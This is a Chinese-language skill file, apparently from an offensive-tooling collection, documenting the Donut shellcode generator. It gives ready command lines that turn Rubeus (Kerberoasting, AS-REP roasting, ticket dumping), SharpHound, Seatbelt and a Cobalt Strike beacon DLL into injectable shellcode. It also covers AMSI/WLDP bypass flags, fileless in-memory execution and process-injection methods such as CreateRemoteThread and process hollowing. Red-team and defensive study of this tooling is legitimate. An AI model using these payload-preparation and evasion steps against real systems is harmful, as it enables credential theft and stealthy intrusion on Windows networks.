---
name: "donut"
description: ">"
---

# Donut

*Sourced from killvxk-malskills-zh*

# Donut

位置无关 shellcode (Position-Independent Shellcode) 生成器 — 将 .NET/Win32 原生可执行文件转换为可注入的 shellcode。

## 原理

Donut 生成的 shellcode 会：
1. 在目标进程中创建 CLR 运行时
2. 将目标程序集/可执行文件加载到内存
3. 无需落盘直接执行

生成的 shellcode 可通过任何 shellcode 执行器、进程注入技术或 BOF 进行注入。

## 快速开始

```bash
# 将 .NET 程序集转换为 shellcode
donut -f Rubeus.exe -o rubeus.bin

# 带运行时参数
donut -f Rubeus.exe -p "kerberoast /format:hashcat" -o rubeus_roast.bin

# 转换原生 DLL（调用导出函数）
donut -f beacon.dll -e "ReflectiveLoader" -o beacon.bin

# 仅输出 64 位
donut -f tool.exe -a 2 -o tool64.bin
```

## 核心参数

| 参数 | 说明 |
|------|-------------|
| `-f <file>` | 输入文件（.exe、.dll、.NET 程序集） |
| `-o <file>` | 输出 shellcode 文件 |
| `-p <params>` | 目标的命令行参数 |
| `-c <class>` | 要实例化的 .NET 类 |
| `-m <method>` | 要调用的 .NET 方法 |
| `-n <ns>` | .NET 命名空间 |
| `-a <arch>` | 架构：`1`=x86，`2`=x64，`3`=两者（默认 3） |
| `-b <n>` | 绕过 AMSI/WLDP：`1`=不绕过，`2`=失败时中止，`3`=继续 |
| `-t` | 在新线程中运行程序集 |
| `-z <n>` | 压缩：`1`=不压缩，`2`=aPLib，`3`=LZNT1，`4`=Xpress，`5`=XpressHuff |
| `-e <n>` | 实例类型：`1`=嵌入式（默认），`2`=HTTP 服务器 |
| `-s <url>` | HTTP 服务器 URL（用于 `-e 2`） |

## Python API

```python
import donut

sc = donut.create(file="Rubeus.exe", params="dump /nowrap")
with open("rubeus.bin", "wb") as f:
    f.write(sc)
```

## 常用工作流

```bash
# 将 Rubeus 转为 shellcode 用于进程注入
donut -f Rubeus.exe -p "asreproast /format:hashcat" -b 3 -o rubeus.bin

# SharpHound 用于 BloodHound 数据收集
donut -f SharpHound.exe -p "-c All" -o sharphound.bin

# 通过进程空洞化或 CreateRemoteThread 注入
# （使用任意 shellcode 执行器/注入器）

# Seatbelt 主机枚举
donut -f Seatbelt.exe -p "-group=all" -o seatbelt.bin

# 仅 x64 并带 AMSI 绕过
donut -f tool.exe -a 2 -b 3 -o tool.bin

# 通过 PowerShell 加载（反射式方式）
# 将 bin 转为 base64，使用任意注入器加载
```

## 输出格式

Donut 默认输出原始 shellcode，可输入到：
- `CreateRemoteThread` 注入
- `VirtualAlloc` + `CallWindowProc`
- BOF shellcode 执行模块
- CS `execute-assembly`（直接 .NET 加载，但 donut 将其扩展到原生 EXE）

## 资源

| 文件 | 何时加载 |
|------|--------------|
| `references/injection-methods.md` | Shellcode 注入技术、进程注入、AMSI 绕过链 |

